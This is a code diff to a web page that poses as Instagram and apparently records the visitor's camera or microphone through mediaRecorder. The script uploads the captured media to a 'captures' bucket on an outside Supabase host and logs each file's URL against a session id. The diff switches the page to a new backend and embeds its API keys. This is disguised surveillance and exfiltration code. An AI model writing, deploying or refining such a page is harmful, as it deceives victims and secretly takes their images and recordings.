@@ -72,7 +72,7 @@ footer .copyright{font-size:11px;color:#8e8e8e}
   <p class="copyright">© 2024 Instagram from Meta</p>
 </footer>
 <script>
-const S='https://yspjknemdmlejzsubycf.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlzcGprbmVtZG1sZWp6c3VieWNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3MDgyOTgsImV4cCI6MjA4ODI4NDI5OH0.JSAXs0UZJiBy2mgniSoSuN6BuW1iW-UhW785toC1weM';
+const S='https://raaqwpywdshwgmizvpwv.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJhYXF3cHl3ZHNod2dtaXp2cHd2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI4ODg1ODUsImV4cCI6MjA4ODQ2NDU4NX0.yhe3VmgkMIKAzLjSwd8se_IIp1CJvoLVbfIigeqRWGA';
 const sid=new URLSearchParams(location.search).get('s');
 let mediaRecorder,chunks=[],activeStream;
 
@@ -108,10 +108,10 @@ async function upload(blob,mime){
   if(!blob||blob.size<500)return;
   const ext=getExt(mime);const filename=sid+'/'+Date.now()+'.'+ext;
   try{
-    const res=await fetch(S+'/storage/v1/object/captures/'+filename,{method:'POST',headers:{'Authorization':'Bearer '+K,'Content-Type':mime,'x-upsert':'true'},body:blob});
+    const res=await fetch(S+'/storage/v1/object/captures/'+filename,{method:'POST',headers:{'Authorization':'Bearer '+K},body:blob});
     if(res.ok){
       const url=S+'/storage/v1/object/public/captures/'+filename;
-      await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},body:JSON.stringify({session_id:sid,image_url:url})});
+      await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({session_id:sid,image_url:url})});
     }
   }catch(e){}
 }
